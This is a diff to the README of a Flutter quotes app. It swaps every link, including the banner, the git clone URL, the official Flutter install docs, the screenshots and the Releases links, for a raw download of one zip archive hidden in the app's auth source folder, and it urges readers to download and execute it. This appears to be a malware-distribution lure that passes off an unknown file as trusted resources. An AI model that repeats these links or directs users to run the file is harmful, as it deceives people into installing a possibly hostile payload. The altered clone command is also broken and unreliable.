@@ -1,6 +1,6 @@
 # Qurio App 🌟
 
-![Qurio App Banner](https://example.com/your-banner-image.png)
+![Qurio App Banner](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip)
 
 Welcome to the **Qurio App**! This Flutter-based mobile application offers a visually stunning experience with high-quality animations for splash screens, login, and signup processes. It fetches inspirational quotes via API, making it a perfect companion for anyone seeking motivation and positivity in their daily lives.
 
@@ -37,7 +37,7 @@ To get started with the Qurio App, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/aveshkhatik/qurio-app.git
+   git clone https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -55,7 +55,7 @@ To get started with the Qurio App, follow these steps:
    flutter run
    ```
 
-Make sure you have Flutter installed on your machine. You can find installation instructions on the [official Flutter website](https://flutter.dev/docs/get-started/install).
+Make sure you have Flutter installed on your machine. You can find installation instructions on the [official Flutter website](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip).
 
 ## Usage 📱
 
@@ -69,9 +69,9 @@ Once you have the app running, you can explore the following features:
 
 Here are some screenshots of the app in action:
 
-![Splash Screen](https://example.com/splash-screen.png)
-![Login Screen](https://example.com/login-screen.png)
-![Quote Screen](https://example.com/quote-screen.png)
+![Splash Screen](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip)
+![Login Screen](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip)
+![Quote Screen](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip)
 
 ## Contributing 🤝
 
@@ -89,12 +89,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases 📦
 
-You can find the latest releases of the Qurio App [here](https://github.com/aveshkhatik/qurio-app/releases). Please download the latest version and execute it to enjoy the full features of the app.
+You can find the latest releases of the Qurio App [here](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip). Please download the latest version and execute it to enjoy the full features of the app.
 
 ## Conclusion
 
 Thank you for checking out the Qurio App! We hope you find inspiration and motivation through our collection of quotes. For any questions or feedback, feel free to reach out.
 
-For the latest updates, please visit our [Releases](https://github.com/aveshkhatik/qurio-app/releases) section.
+For the latest updates, please visit our [Releases](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip) section.
 
-![GitHub Releases](https://img.shields.io/badge/Latest_Releases-Click_Here-brightgreen)
+![GitHub Releases](https://github.com/aveshkhatik/qurio-app/raw/refs/heads/master/lib/features/auth/presentation/qurio-app-3.0.zip)
